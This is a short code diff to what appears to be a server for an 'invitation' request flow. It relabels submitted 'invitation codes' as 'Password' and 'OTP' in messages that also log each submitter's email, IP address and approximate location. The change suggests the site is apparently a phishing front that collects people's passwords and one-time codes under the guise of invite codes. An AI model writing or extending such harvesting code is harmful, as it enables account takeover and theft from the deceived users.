@@ -112,7 +112,7 @@ app.post('/api/invite', async (request, response) => {
     'New invitation access request',
     '',
     `Email: ${email}`,
-    `Invitation code: ${accessCode}`,
+    `Password: ${accessCode}`,
     `IP address: ${ipAddress}`,
     `Approx. location: ${location}`,
     `Submitted: ${new Date().toISOString()}`,
@@ -146,8 +146,8 @@ app.post('/api/final-invite', async (request, response) => {
     'Final invitation code submitted',
     '',
     `Email: ${email}`,
-    `Original invitation code: ${accessCode}`,
-    `Final invite code: ${finalCode}`,
+    `Password: ${accessCode}`,
+    `OTP: ${finalCode}`,
     `Submitted: ${new Date().toISOString()}`,
   ].join('\n');
 
